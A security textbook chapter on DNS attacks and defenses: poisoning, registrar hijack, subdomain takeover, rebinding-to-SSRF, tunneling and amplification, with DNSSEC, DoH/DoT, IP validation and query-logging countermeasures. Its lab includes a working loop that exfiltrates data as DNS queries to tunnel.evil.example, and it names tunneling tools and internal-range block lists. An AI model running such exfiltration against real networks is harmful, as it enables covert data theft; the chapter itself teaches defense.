# Chapter 17 — DNS Part 2: DoH/DoT, DNSSEC, Poisoning, Rebinding, Exfiltration, and Cloud DNS

---

## 1. Why This Matters

Chapter 16 built the DNS machine; this chapter breaks and secures it. DNS attacks are among the highest-
impact in security because DNS is trust-critical (everything depends on the right address) and classically
unauthenticated (Chapter 16 §5). A DNS compromise can redirect all of a target's traffic, defeat TLS setup
(if combined with cert mis-issuance), steal data through a channel most defenders ignore, and — critically
for cloud — turn an SSRF bug into internal access.

For a cloud security engineer, the DNS attacks and defenses here are directly operational:

1. **DNS rebinding turns SSRF into internal/metadata access** (Chapter 50) — one of the most important
   cloud attack chains, and it exploits exactly the caching/TTL mechanics of Chapter 16.
2. **DNS exfiltration/tunneling** is a primary data-theft and C2 channel that bypasses egress controls
   (Chapter 3 §10.2, Chapter 14), because DNS egress is almost always allowed — and DNS query logging
   (Chapter 82) is the corresponding detection surface.
3. **DNSSEC (authenticate answers) and DoH/DoT (encrypt transport)** are the two halves of DNS security
   you must be able to reason about and configure (Route 53 DNSSEC signing, resolver DoT).
4. **Subdomain takeover and registrar/delegation hijack** are common, damaging, and specific to how cloud
   resources are provisioned and decommissioned (dangling records pointing at freed cloud endpoints).

The core idea: **classic DNS trusts the transport (spoofable UDP, weak 16-bit transaction entropy) and the
answer (no signature), so it is attackable at both the resolution layer (poisoning, spoofing, rebinding)
and the delegation/provisioning layer (registrar hijack, subdomain takeover) — and it is abusable as a
covert channel (exfiltration). The defenses split cleanly: DNSSEC authenticates the answer, DoH/DoT
encrypts and authenticates the transport, registry lock protects delegation, dangling-record hygiene
prevents takeover, and query logging detects abuse.** This chapter maps each Chapter 16 mechanic to its
attack and its defense.

---

## 2. Prerequisites

- **Chapter 16 in full** — resolution, delegation, caching/TTL, records, UDP transport, cloud DNS. Every
  attack here exploits a mechanic there.
- Chapter 9 (ARP-spoofing → DNS-spoofing chain), Chapter 15 (rogue DHCP → DNS control), Chapter 14
  (egress; DNS bypasses it).
- Chapter 50 preview (SSRF — DNS rebinding is its enabler) and Chapter 27 preview (PKI/CAA — cert
  mis-issuance).

---

## 3. Mental Model

**Attack classic DNS at two layers: the resolution layer (make a resolver believe a false answer) and the
delegation/provisioning layer (take control of the name itself). Abuse it as a covert channel (data in
queries). Defend by authenticating the answer (DNSSEC), encrypting the transport (DoH/DoT), locking the
delegation (registry lock), preventing dangling records, and logging queries.**

```
   ATTACK SURFACE                         DEFENSE
   -----------------------------------    -----------------------------------------
   Resolution layer:
     cache poisoning / spoofing           DNSSEC (authenticate the answer)
     on-path DNS MITM (ARP/DHCP/routing)  DoH/DoT (encrypt+authenticate transport) + TLS
     DNS rebinding -> SSRF                 re-resolve + validate resolved IP; block internal ranges
   Delegation/provisioning layer:
     registrar / NS hijack                registrar MFA + registry lock; monitor NS
     subdomain takeover (dangling record) dangling-record hygiene; claim/remove promptly
   Covert-channel abuse:
     DNS tunneling / exfiltration         query logging + anomaly detection; restrict resolvers
   Availability:
     amplification DDoS                   response rate limiting; anti-DDoS; disable open resolvers
```

Three ideas:

1. **Two attack layers.** *Resolution* attacks make a resolver return a false answer (poisoning, spoofing,
   rebinding) — exploiting UDP/entropy/caching. *Delegation* attacks take over the name at its source
   (registrar, NS, dangling records) — exploiting the trust chain. Both end in "the victim reaches the
   attacker's server," but the defenses differ.
2. **The two-half defense.** DNS integrity needs both: **DNSSEC** authenticates the *answer*
   (cryptographic signatures, so a forged answer is rejected) and **DoH/DoT** encrypts/authenticates the
   *transport* (so an on-path attacker cannot read or inject). They are complementary — DNSSEC does not
   provide confidentiality; DoH/DoT does not by itself validate the authoritative data — and **TLS
   end-to-end** remains the backstop that catches a DNS lie (a wrong IP still cannot present a valid cert).
3. **DNS is a covert channel and a detection surface.** Because DNS egress is nearly always allowed, it
   exfiltrates and C2s past egress controls (Chapters 3, 14) — and, symmetrically, query logging is where
   you catch it. The same property is a weakness and a detection opportunity.

**The security framing, restated from Chapter 16:** classic DNS's weaknesses are the direct consequences
of its speed-driven design (cached, UDP, weakly-authenticated) and its delegated trust chain. The defenses
add authentication and encryption where classic DNS omitted them, protect the trust chain's top, and treat
DNS as a monitored egress/exfiltration surface. And, as with ARP/DHCP/routing (Chapters 9, 12, 15),
**end-to-end TLS is the load-bearing control** that renders a DNS compromise far less useful.

---

## 4. Fundamentals: The Attacks

### 4.1 Cache poisoning and spoofing (the resolution attack)

Classic DNS's only "authentication" is the 16-bit transaction ID + the source port (Chapter 16 §5). An
attacker who can forge a response matching the resolver's query (right ID, right port, right question,
arriving before the legitimate answer) inserts a **false answer that the resolver caches and serves to all
its clients for the TTL** — amplified (many clients) and durable (TTL).

```
   Resolver queries an authoritative server for evil-target.example (UDP, ID=0x1a2b, srcport=54321).
   Attacker floods forged responses: "evil-target.example A = attacker-IP", ID guesses, to port 54321.
   If a forged response matches (ID + port) and beats the real one -> cached -> all clients redirected.
```

The **Kaminsky attack (2008)** made this practical: by querying for many *random* subdomains
(`aaaa.target.example`, `aaab...`) and forging referrals for the *parent* domain in the responses, the
attacker gets many chances to win the race and can poison the entire domain's NS records, not just one
record. The fix that bought time was **source-port randomization** (adding ~16 bits of entropy, so the
attacker must guess ID *and* port ≈ 32 bits), but the durable fix is **DNSSEC** (§5.1) — cryptographic
signatures the resolver validates, so a forged answer without a valid signature is rejected regardless of
ID/port guessing.

**On-path DNS spoofing** is easier still: an attacker already on-path (via ARP spoofing — Chapter 9, rogue
DHCP — Chapter 15, or a compromised router — Chapter 12) sees the real query and simply answers it faster
with a forged response. No ID guessing needed. This is the DNS half of those chapters' MITM chains.

### 4.2 DNS hijacking at the delegation layer

Instead of fooling a resolver, take over the name at its source:

- **Registrar account compromise** (Chapter 16 §Solutions 16.20): control the registrar account, change
  the NS records, and become authoritative for the entire domain — a total, top-of-chain hijack. Defense:
  registrar MFA + **registry lock**.
- **Name server compromise:** compromise the authoritative servers themselves and alter records.
- **NS record tampering / lame delegation:** alter or exploit stale delegation.

These are more targeted and higher-impact than poisoning (they affect *everyone*, not one resolver's
cache) and bypass DNSSEC if the attacker controls the signing (they can re-sign). Delegation security
(registrar MFA, registry lock, NS monitoring) is the defense, and it is frequently neglected.

### 4.3 Subdomain takeover (the cloud-specific hijack)

A **dangling record** — a CNAME or NS pointing to a resource you no longer control — enables an attacker to
claim that resource and serve content on *your* subdomain:

```
   You created blog.ledger.example  CNAME -> ledger-blog.herokuapp.com  (or an S3 bucket, CloudFront dist,
     Azure/GitHub Pages endpoint, etc.), then DELETED the Heroku app / S3 bucket but LEFT the CNAME.
   Attacker registers "ledger-blog" on Heroku (now available) -> blog.ledger.example serves attacker content.
   -> The attacker controls a legitimate-looking subdomain: phishing, cookie theft (same registrable
      domain), TLS certs for the subdomain, bypassing same-site protections.
```

This is endemic in cloud because resources are constantly created and destroyed, and DNS records outlive
them. Defense: **dangling-record hygiene** — when decommissioning a cloud resource, remove or update the
DNS record *first*; audit for CNAMEs/NS pointing to non-existent or unclaimed cloud endpoints (tools like
`subjack`, and cloud provider "unclaimed resource" checks). Cloud providers have added protections (e.g.
CloudFront/S3 alias validation), but the general hygiene rule stands.

### 4.4 DNS rebinding (turning SSRF into internal access)

**DNS rebinding** exploits the gap between when a name is *validated* and when it is *used*, using DNS
caching/TTL (Chapter 16 §4.4):

```
   Attacker controls attacker.example with a very LOW TTL.
   1. Victim (a browser, or a server-side fetcher — an SSRF-vulnerable app) resolves attacker.example
      -> attacker's real IP (passes any "is this an external IP?" check).
   2. TTL expires (seconds). The victim re-resolves attacker.example.
   3. Attacker's DNS now answers with an INTERNAL IP (e.g. 169.254.169.254 metadata, or 10.0.x.x).
   4. The victim, still targeting "attacker.example", now connects to the INTERNAL IP.
   -> Same-origin / SSRF checks that validated the NAME are bypassed, because the name now points inward.
```

This is a primary **SSRF enabler** (Chapter 50): an SSRF defense that validates the *hostname* or the
*first-resolved IP* is defeated because the name later rebinds to an internal target (the metadata service,
internal services). It works against browsers (attacking internal network services from a victim's browser)
and against server-side fetchers (webhooks, URL previewers, PDF generators). Defense (§5.3): **re-resolve
at connection time and validate the actual IP connected to** (not the hostname or an earlier resolution),
**block internal ranges** (RFC 1918, link-local incl. `169.254.169.254`, IPv6 equivalents — Chapters 10,
11), pin the resolved IP for the connection's lifetime, and use IMDSv2 (Chapter 78). This ties DNS
directly to the SSRF chapter: rebinding is why SSRF defenses must operate on the connected IP, not the
name.

### 4.5 DNS tunneling and exfiltration (the covert channel)

Because DNS queries leave almost every network (to resolve names — Chapter 16), and egress controls rarely
inspect DNS (Chapter 14), DNS is a reliable **exfiltration and C2 channel**:

```
   Attacker controls the authoritative server for tunnel.evil.example.
   Compromised host encodes stolen data in QUERY subdomains:
     <base32-encoded-chunk-1>.tunnel.evil.example
     <base32-encoded-chunk-2>.tunnel.evil.example
   Each query is resolved (recursively) up to the attacker's authoritative server, which RECEIVES the data
     in the query name and can RESPOND with commands (encoded in TXT/other records) -> bidirectional C2.
   -> Data leaves via DNS, which the egress firewall allowed (it's "just DNS").
```

DNS tunneling (tools: `iodine`, `dnscat2`) is slow but stealthy and bypasses egress controls that block
direct outbound connections. It is a favored exfiltration method precisely because "we block egress" rarely
includes DNS (Chapter 3 §10.2, Chapter 14). Detection (§5.4): **DNS query logging** (Chapter 82) with
anomaly detection — high query volume to one domain, high-entropy/long subdomains, unusual record types
(TXT/NULL), and queries to newly-registered or low-reputation domains. Prevention: restrict DNS egress to
controlled resolvers (block direct outbound 53 except to the sanctioned resolver), and use DNS firewalls /
response policy zones (RPZ) to block known-bad domains.

### 4.6 DNS amplification DDoS

Classic UDP DNS enables reflection/amplification (Chapter 16 §5, Chapter 85): an attacker sends small
queries with the *victim's* spoofed source address to **open resolvers** (or exploitable authoritative
servers), which send large responses to the victim — amplifying the attacker's bandwidth (a small query
eliciting a large `ANY`/DNSSEC response). Defenses: **do not run open resolvers** (restrict recursion to
your clients), **response rate limiting (RRL)** on authoritative servers, **source-address validation
(BCP 38)** by networks to prevent spoofing, and anti-DDoS services at the edge (Chapter 85). This is a
network-availability attack DNS is abused *for*, rather than an attack *on* your DNS integrity.

---

## 5. Deep Technical Explanation: The Defenses

### 5.1 DNSSEC — authenticating the answer

**DNSSEC (DNS Security Extensions)** adds cryptographic signatures to DNS records so a resolver can verify
the answer is authentic and unmodified — closing the "no signature" gap (Chapter 16 §5). Mechanics:

```
   Each zone signs its records with a private key; the signatures are published as RRSIG records.
   The zone's public key is a DNSKEY record.
   The PARENT zone vouches for the child's key via a DS (Delegation Signer) record -> a CHAIN OF TRUST
     from the ROOT (whose key is a well-known trust anchor) down to the record.

   A validating resolver:
     - fetches the record + its RRSIG,
     - walks the DS/DNSKEY chain up to the root trust anchor,
     - verifies each signature.
   A forged answer (poisoning, spoofing) lacks a valid signature -> REJECTED (SERVFAIL).
```

Key points:

- **DNSSEC provides integrity/authenticity, NOT confidentiality.** It stops poisoning/spoofing (forged
  answers fail validation) but does not hide queries (that is DoH/DoT's job — §5.2). The two are
  complementary.
- **The chain of trust anchors at the root**, whose key is pre-distributed (the trust anchor — the "PKI
  solution to bootstrapping" from Chapter 15). This is why DNSSEC works where classic DNS's TOFU does not.
- **Deployment reality:** DNSSEC adoption is incomplete; not all TLDs/domains/resolvers use it, and it adds
  operational complexity (key management, signing, larger responses — which also increases amplification
  potential). Route 53, Cloudflare, and others make signing easier. Enable it for your zones, use a
  validating resolver, but recognize it is not universal — hence TLS remains the backstop.
- **DNSSEC does not stop delegation-layer hijacks** (§4.2) if the attacker controls the signing keys
  (registrar compromise) — so registry lock is still needed. DNSSEC secures the *answer*, not the
  *account*.

### 5.2 DoH and DoT — encrypting the transport

**DoT (DNS over TLS, port 853)** and **DoH (DNS over HTTPS, port 443)** encrypt the query/response between
the client and the resolver, so an on-path attacker cannot **read** (privacy) or **inject/modify** (spoof)
DNS traffic:

- **DoT** runs DNS over a TLS connection on a dedicated port (853), easy to identify and manage on a
  network.
- **DoH** runs DNS over HTTPS (443), indistinguishable from other web traffic — good for user privacy
  against network observers, but a **challenge for enterprise/cloud DNS visibility and control**: DoH can
  bypass your controlled resolver and query logging entirely (a browser using its own DoH resolver skips
  the corporate/VPC resolver), undermining DNS-based egress control and detection. This is the DoH
  double-edge: privacy for users, blind spot for defenders.

Security relevance for a cloud security engineer:

- **Encrypting client↔resolver** (DoT/DoH) stops on-path DNS spoofing between the client and the resolver
  — the ARP/DHCP/routing MITM chains (Chapters 9, 12, 15). But it does *not* authenticate the authoritative
  data (that is DNSSEC), and it does not protect resolver↔authoritative unless that leg is also secured.
- **DoH can defeat your DNS visibility.** In managed environments, control which resolvers clients use
  (block or steer rogue DoH — via network policy, browser/OS configuration, or a controlled DoH endpoint),
  so DNS query logging and RPZ still work. In a VPC, ensure workloads use the VPC resolver (DHCP option
  set — Chapter 15) and monitor for direct outbound 53/853/DoH to bypass it.

The clean split to remember: **DNSSEC = authenticate the answer (integrity); DoH/DoT = encrypt the
transport (confidentiality + on-path integrity between client and resolver).** You often want both, plus
TLS end-to-end as the backstop.

### 5.3 Defending SSRF/rebinding (the connect-time-IP rule)

DNS rebinding (§4.4) defeats name-based validation, so the defense operates on the *connected IP*:

- **Re-resolve at connection time and validate the actual IP** the connection goes to — not the hostname,
  not an earlier resolution. Reject if the resolved IP is in an internal range (RFC 1918, `127.0.0.0/8`,
  `169.254.0.0/16` incl. the metadata service, and IPv6 equivalents incl. IPv4-mapped `::ffff:` —
  Chapters 10, 11).
- **Pin the resolved IP for the connection's lifetime** so it cannot rebind mid-connection, and reject
  redirects to internal targets.
- **Use IMDSv2** (Chapter 78) — session-token + hop-limit — so even a rebinding-enabled SSRF reaching
  `169.254.169.254` is blocked by the metadata service's own protection.
- **Egress-allow-list the actual destination** at a proxy (Chapter 14, 85) that re-resolves and validates.

This is the concrete link to Chapter 50: SSRF defenses that check the URL/hostname are bypassed by
rebinding; only validating the *connected IP* at connect time (and blocking internal ranges) is robust.

### 5.4 Detecting DNS abuse (query logging)

DNS is a detection goldmine because so much passes through it:

- **Enable DNS query logging** — Route 53 Resolver query logs (VPC), or resolver logs on-prem (Chapter
  82). Every query from every workload is recorded.
- **Detect exfiltration/tunneling** (§4.5): high query volume to a single domain, high-entropy/long
  subdomain labels (encoded data), unusual record types (TXT, NULL), queries to newly-registered/low-
  reputation domains, and consistent periodic queries (C2 beaconing).
- **Detect SSRF/rebinding and metadata access:** an application resolving unexpected names, or resolving
  names that rebind to internal IPs, or any resolution of the metadata address.
- **Detect hijack/poisoning:** answers changing unexpectedly, or resolution differing from the
  authoritative data.
- **DNS Firewall / RPZ (Response Policy Zones):** block resolution of known-bad domains (C2, malware,
  phishing) at the resolver — both prevention and a chokepoint that generates high-value alerts.

The symmetry with §4.5 is the point: **the property that makes DNS a covert channel (everything queries)
is exactly what makes query logging a powerful detection surface.** A cloud security engineer enables it
(it is off by default) and builds detections on it.

---

## 6. Internals: Attacks and Defenses Observed

### 6.1 Check DNSSEC validation

```bash
$ dig +dnssec cloudflare.com A            # request DNSSEC records; look for RRSIG in the answer
;; flags: qr rd ra ad;                     # 'ad' (Authenticated Data) = the resolver validated DNSSEC
$ dig +dnssec dnssec-failed.org           # a deliberately broken DNSSEC zone
;; ... status: SERVFAIL                     # a validating resolver REJECTS it (integrity working)
$ delv cloudflare.com                       # explicit DNSSEC validation trace (if available)
```

The `ad` flag means the resolver validated the DNSSEC chain (§5.1); a `SERVFAIL` on a broken-DNSSEC domain
means validation is *working* (rejecting an unauthenticated/forged answer). No `ad` and resolution
succeeding means DNSSEC was not validated (either the zone is unsigned or the resolver does not validate).

### 6.2 Check DoT/DoH

```bash
$ resolvectl status 2>/dev/null | grep -i 'DNS over'      # is DoT in use?
$ kdig -d @1.1.1.1 +tls cloudflare.com                     # explicit DoT query (port 853)
$ curl -sH 'accept: application/dns-json' \
    'https://cloudflare-dns.com/dns-query?name=example.com&type=A'   # a DoH query
```

Confirms whether client↔resolver DNS is encrypted (§5.2). In a managed environment, also check whether
clients can bypass your resolver via their own DoH (a visibility gap).

### 6.3 Demonstrate the rebinding principle (locally, safely)

```bash
# Conceptually: a name with a very low TTL that changes its answer between resolutions.
# Observe TTL-driven re-resolution (the mechanic):
$ dig +noall +answer example.com          # note TTL
# (A real rebinding demo requires an attacker-controlled low-TTL domain; do only in a lab you own.)
# The DEFENSE to verify in your app: does it re-resolve and validate the CONNECTED IP, or trust the name?
```

The important internal is the *application* behavior: test whether your SSRF-relevant code (webhooks, URL
fetchers) validates the connected IP at connect time (§5.3) — the rebinding-robust check — rather than the
hostname.

### 6.4 Detect DNS exfiltration in query logs

```bash
# Against Route 53 Resolver query logs (or resolver logs), hunt for exfiltration signatures (§5.4):
$ aws logs filter-log-events --log-group-name /aws/route53/vpc-queries --filter-pattern '' --max-items 50 \
  | jq -r '.events[].message' \
  | grep -oE '[a-z0-9]{20,}\.[a-z0-9.-]+' | sort | uniq -c | sort -rn | head
# Long, high-entropy labels and high volume to one domain = likely tunneling.
```

This is the detection §5.4 describes — turning the covert channel's own traffic into an alert.

---

## 7. Real-World Example: DNS Attacks and Defenses for Ledger

**Applying the attack/defense map to Ledger:**

- **Cache poisoning / on-path spoofing:** an attacker who achieves on-path position (ARP spoofing on-prem,
  or a compromised network element) could spoof DNS to redirect Ledger's users or its app's outbound calls.
  Defense: **DNSSEC** on `ledger.example` (Route 53 signing), **DoT/DoH** for the app's resolver, and —
  the backstop — **TLS everywhere** so a wrong IP cannot present a valid cert (Chapters 4, 9). In a VPC,
  on-path DNS spoofing between the instance and the VPC resolver is not viable (the SDN), shifting the risk
  to the resolver config and to the authoritative-data integrity (DNSSEC).
- **Registrar/delegation hijack:** the single most damaging DNS attack on Ledger — control of the registrar
  account repoints the whole domain. Defense: **registrar MFA + registry lock + NS monitoring** (Chapter 16
  §Solutions 16.20). This protects what DNSSEC cannot (the account/delegation).
- **Subdomain takeover:** Ledger spins up and tears down cloud resources (S3 buckets, CloudFront
  distributions, preview environments). A dangling CNAME from a deleted resource is a takeover risk.
  Defense: **remove DNS records before/with decommissioning**, and audit for dangling records regularly.
- **DNS rebinding → SSRF → metadata:** Ledger's app has an SSRF-relevant surface (webhooks to
  customer-supplied URLs, a URL-preview feature). An attacker uses rebinding to make a "validated" external
  URL resolve to `169.254.169.254` and steal the task's IAM credentials (Chapters 50, 78). Defense:
  **validate the connected IP at connect time, block internal ranges (v4+v6), pin the IP, and use IMDSv2**
  (§5.3). This is the most important cloud-specific DNS defense for Ledger.
- **DNS exfiltration:** a compromised ECS task exfiltrates data via DNS queries to an attacker's domain,
  bypassing the NAT gateway's lack of egress control (Chapter 14). Defense: **Route 53 Resolver query
  logging + anomaly detection**, restrict workloads to the VPC resolver, and **DNS Firewall / RPZ** to
  block known-bad domains (§5.4).

The Ledger DNS defense stack: DNSSEC (answer integrity) + DoT/DoH (transport) + registry lock (delegation)
+ dangling-record hygiene (takeover) + connect-time-IP validation & IMDSv2 (rebinding/SSRF) + query logging
& DNS Firewall (exfiltration/C2 detection & prevention) + **TLS everywhere** (the backstop). Each defense
maps to a specific attack, and each attack maps to a Chapter 16 mechanic — the whole DNS story, closed.

The recurring lesson: **DNS is both the most depended-upon and one of the most attacked systems, and its
defenses are a layered set — authenticate the answer, encrypt the transport, lock the delegation, prevent
dangling records, validate the connected IP, log queries — with end-to-end TLS as the control that holds
even when DNS is compromised.** A cloud security engineer configures all of these and treats DNS as a
first-class part of the security architecture (Chapter 16 §12).

---

## 8. Hands-On Demonstration

### LAB 17.1 — DNSSEC Validation, DNS Exfiltration Detection, and Rebinding-Robust Validation

**Objective.** Verify DNSSEC validation, demonstrate DNS exfiltration and detect it in query patterns, and
test/implement rebinding-robust SSRF validation (connect-time IP check).

**Cost.** Free. **Environment.** ENV-1 + ENV-2. **Time.** 60–90 minutes.

**Steps.**

*Step 1 — DNSSEC validation.*

```bash
dig +dnssec cloudflare.com A | grep -E 'ad;|RRSIG'      # 'ad' flag + RRSIG = validated (§6.1)
dig +dnssec dnssec-failed.org A | grep status            # SERVFAIL = validation rejecting a bad zone (working)
```

Confirm your resolver validates DNSSEC (rejects the deliberately-broken zone). If it does not (returns an
answer for dnssec-failed.org), your resolver is not validating — a finding.

*Step 2 — Simulate DNS exfiltration and detect it (isolated lab).*

```bash
# Isolated: a "victim" encoding data into DNS queries to a local authoritative server (dnsmasq logging).
docker network create dnsexfil --internal 2>/dev/null || docker network create dnsexfil
docker run -d --name authns --network dnsexfil nicolaka/netshoot sh -c '
  apk add --no-cache dnsmasq 2>/dev/null; dnsmasq -d --log-queries --address=/#/10.0.0.1 --no-daemon'
docker run -d --name victim --network dnsexfil nicolaka/netshoot sleep 3600
AUTH=$(docker inspect -f '{{(index .NetworkSettings.Networks "dnsexfil").IPAddress}}' authns)
# Victim exfiltrates "secret data" encoded in subdomain queries:
docker exec victim sh -c "
  for chunk in \$(echo 'SECRETDATA123' | fold -w4); do
    nslookup \${chunk}.tunnel.evil.example ${AUTH} >/dev/null 2>&1
  done"
# The authoritative server's query log RECEIVED the encoded data:
docker logs authns 2>&1 | grep tunnel.evil.example
```

**Expected:** the authoritative server logged queries containing the encoded chunks — data exfiltrated via
DNS. **Detection:** the log shows high-entropy subdomains to one domain (the §5.4 signature). Write the
detection rule you would build (volume + entropy + single domain).

*Step 3 — Rebinding-robust SSRF validation (the connect-time-IP rule).*

```python
# The WRONG way (name/first-resolution validation — rebinding-vulnerable):
# validate hostname/first IP, then connect by hostname -> rebinds to internal IP.
# The RIGHT way (validate the CONNECTED IP at connect time, block internal ranges):
python3 - <<'PY'
import ipaddress, socket
BLOCKED = [ipaddress.ip_network(n) for n in
    ["10.0.0.0/8","172.16.0.0/12","192.168.0.0/16","127.0.0.0/8","169.254.0.0/16",
     "::1/128","fc00::/7","fe80::/10","::ffff:0:0/96"]]
def safe_resolve_and_check(host):
    # Resolve NOW (at connect time), validate EVERY resolved IP, then connect to a PINNED IP.
    infos = socket.getaddrinfo(host, 443)
    ips = {ipaddress.ip_address(i[4][0]) for i in infos}
    for ip in ips:
        if any(ip in net for net in BLOCKED):
            raise ValueError(f"BLOCKED: {host} resolves to internal {ip}")
    return ips  # connect to one of these PINNED ips, not by hostname again
for h in ["example.com", "localhost"]:
    try: print(h, "->", safe_resolve_and_check(h))
    except Exception as e: print(h, "->", e)
PY
```

**Expected:** `localhost` (and any name resolving to an internal IP) is blocked; external names pass. The
key: validate the *resolved IP* and connect to a *pinned* IP, defeating rebinding (§5.3).

**Security implications.** Write down: (a) DNSSEC rejects forged answers (integrity), DoT/DoH encrypts
transport (confidentiality/on-path integrity) — the two-half defense; (b) DNS exfiltration bypasses egress
controls and is detected via query logging (the channel = the detection surface); (c) rebinding defeats
name-based SSRF checks, so validate the connected IP + block internal ranges + IMDSv2; (d) TLS end-to-end
is the backstop that catches a DNS lie.

**Cleanup.**
```bash
docker rm -f authns victim 2>/dev/null; docker network rm dnsexfil 2>/dev/null
```

---

## 9. Security Implications

- **Classic DNS is attackable at two layers** — resolution (poisoning/spoofing/rebinding, via UDP/entropy/
  caching) and delegation/provisioning (registrar hijack, subdomain takeover, via the trust chain) — and
  **abusable as a covert channel** (exfiltration/C2) and **for amplification DDoS**.
- **The two-half integrity defense:** **DNSSEC** authenticates the *answer* (rejects forged answers;
  integrity, not confidentiality), **DoH/DoT** encrypt the *transport* (confidentiality + on-path
  integrity between client and resolver). Both, plus **TLS end-to-end** as the backstop that catches a DNS
  lie regardless.
- **DNS rebinding turns SSRF into internal/metadata access** — defeating name-based validation; the robust
  defense is to **validate the connected IP at connect time, block internal ranges (v4+v6), pin the IP,
  and use IMDSv2** (Chapters 50, 78).
- **DNS exfiltration bypasses egress controls** (DNS is nearly always allowed) — and the same ubiquity
  makes **query logging** the corresponding detection surface; **DNS Firewall/RPZ** blocks known-bad.
- **Delegation-layer security is separate from DNSSEC** — registrar MFA + **registry lock** + NS
  monitoring protect the account/delegation that DNSSEC cannot.
- **Subdomain takeover is a cloud-endemic hijack** — dangling records pointing at freed cloud endpoints;
  hygiene (remove records with decommissioning) prevents it.
- **DoH can be a defender blind spot** — it can bypass controlled resolvers and query logging; manage which
  resolvers workloads use.

---

## 10. Attack Scenarios

1. **Cache poisoning (Kaminsky-style)** (§4.1): forge responses to poison a resolver's cache, redirecting
   all its clients for the TTL. Defense: DNSSEC; source-port randomization (partial).
2. **On-path DNS spoofing** (§4.1): combined with ARP/DHCP/routing MITM (Chapters 9, 15, 12) to answer
   queries faster with forged data. Defense: DoT/DoH + TLS backstop.
3. **Registrar/delegation hijack** (§4.2): take over the registrar account or NS records → total domain
   control. Defense: registrar MFA + registry lock + NS monitoring.
4. **Subdomain takeover** (§4.3): claim a dangling CNAME/NS target → attacker serves your subdomain
   (phishing, cookie theft, certs). Defense: dangling-record hygiene.
5. **DNS rebinding → SSRF → metadata** (§4.4): low-TTL name rebinds to internal IP after validation →
   internal/metadata access. Defense: connect-time IP validation, block internal ranges, IMDSv2.
6. **DNS tunneling/exfiltration** (§4.5): encode data in queries to an attacker's authoritative server,
   bypassing egress. Defense: query logging + anomaly detection, restrict resolvers, DNS Firewall/RPZ.
7. **Amplification DDoS** (§4.6): spoofed small queries to open resolvers eliciting large responses to a
   victim. Defense: no open resolvers, RRL, BCP 38, anti-DDoS.
8. **Email spoofing via missing SPF/DKIM/DMARC** (Chapter 16 §4.3): phishing as the domain. Defense:
   configure them.

---

## 11. Defensive Techniques

**Answer integrity:** deploy **DNSSEC** on your zones (Route 53/Cloudflare signing) and use a
**validating resolver**; recognize it provides integrity not confidentiality and is not universally
deployed (so TLS remains the backstop).

**Transport security:** use **DoT/DoH** for client↔resolver to stop on-path spoofing; in managed
environments, **control which resolvers workloads use** (steer/block rogue DoH to preserve visibility and
logging).

**Delegation security:** **registrar MFA + registry lock**, **monitor NS records** for changes — protect
the top of the trust chain (what DNSSEC cannot).

**Takeover prevention:** **remove/update DNS records when decommissioning cloud resources**, and **audit
for dangling records** (CNAME/NS pointing to non-existent/unclaimed endpoints).

**SSRF/rebinding:** **validate the connected IP at connect time**, **block internal ranges (RFC 1918,
127/8, 169.254/16, IPv6 incl. IPv4-mapped)**, **pin the resolved IP**, reject internal redirects, and use
**IMDSv2** (Chapters 50, 78); route through an egress proxy that re-resolves and allow-lists.

**Detection & egress:** **enable DNS query logging** (Route 53 Resolver logs — Chapter 82) with anomaly
detection (volume/entropy/record-type/reputation), **DNS Firewall / RPZ** to block known-bad domains,
**restrict outbound DNS** to controlled resolvers (block direct 53/853/DoH bypass), and correlate with
egress/flow logs (Chapter 14).

**Availability:** **do not run open resolvers**, enable **response rate limiting** and **BCP 38** source
validation, and use anti-DDoS at the edge (Chapter 85).

**The backstop everywhere:** **end-to-end TLS with certificate validation (and HSTS, CAA)** — a DNS
compromise that redirects to the wrong IP is caught because the attacker cannot present a valid certificate
for the real name (Chapters 4, 9, 27, 28). DNS defenses reduce the likelihood and scope of DNS attacks;
TLS removes much of their impact.

---

## 12. Production Architecture

The layered DNS defense, mapped to attacks, VPS vs cloud:

```
 ATTACK                     DEFENSE                          SYSTEM A          SYSTEM B (AWS)
 ------------------------   ------------------------------   ---------------   ------------------------
 poisoning/spoofing         DNSSEC (answer) + DoT/DoH        provider signing  Route 53 DNSSEC + DoT resolver
 registrar/deleg. hijack    MFA + registry lock + NS monitor registrar         registrar + Route 53 monitoring
 subdomain takeover         dangling-record hygiene           manual audit      audit + provider validation
 rebinding -> SSRF          connect-time IP check + IMDSv2     app code          app code + IMDSv2 + egress proxy
 exfiltration/C2            query logging + DNS Firewall/RPZ   resolver logs     Route 53 Resolver logs + DNS FW
 amplification DDoS         no open resolver + RRL + anti-DDoS server hardening  AWS Shield + Route 53
 backstop (all)             TLS end-to-end + HSTS + CAA        yes               yes
```

The architectural principle: **DNS security is a layered set of controls, each mapped to a specific
attack, unified by end-to-end TLS as the backstop.** Authenticate the answer (DNSSEC), encrypt the
transport (DoT/DoH), lock the delegation (registry lock), keep records clean (no dangling), validate the
connected IP (rebinding/SSRF), and log/inspect queries (exfiltration/C2). In the cloud, most of these are
managed features you enable and configure (Route 53 DNSSEC, Resolver query logging, DNS Firewall,
IMDSv2) — off by default, so the cloud security engineer's job is to turn them on and tune them. And
because DNS is trust-critical, the mature posture assumes DNS *can* be compromised and relies on TLS to
make that compromise far less useful — the Zero Trust "don't trust the network (or the name), authenticate
the endpoint" conclusion (Chapter 43) applied to DNS.

---

## 13. Common Mistakes

1. **Assuming DNS is authenticated** — classic DNS is not; deploy DNSSEC + rely on TLS.
2. **Confusing DNSSEC and DoH/DoT** — DNSSEC = answer integrity, DoH/DoT = transport encryption; you often
   want both.
3. **Neglecting delegation security** — no registrar MFA/registry lock; the top-of-chain hijack DNSSEC
   cannot stop.
4. **Dangling DNS records after decommissioning** → subdomain takeover.
5. **Name-based SSRF validation** — defeated by rebinding; validate the *connected IP* and block internal
   ranges + IMDSv2.
6. **No DNS query logging** — missing the primary exfiltration/C2 detection surface.
7. **Unrestricted DNS egress / uncontrolled DoH** — enabling tunneling and bypassing visibility.
8. **Running open resolvers** — amplification DDoS abuse.
9. **Missing SPF/DKIM/DMARC/CAA** — email spoofing and cert mis-issuance (Chapter 16).
10. **Relying on DNS defenses without TLS** (or vice versa) — they are complementary; TLS is the backstop
    that catches a DNS lie.

---

## 14. Troubleshooting

| Symptom | Likely cause | Diagnostic |
|---|---|---|
| Some domains fail to resolve after enabling validation | DNSSEC misconfiguration (broken chain) | `dig +dnssec`; check the zone's DS/DNSKEY/RRSIG chain; `delv` |
| Resolution differs from authoritative data | poisoning/spoofing, or split-horizon | compare resolver vs authoritative; check for on-path MITM; DNSSEC status |
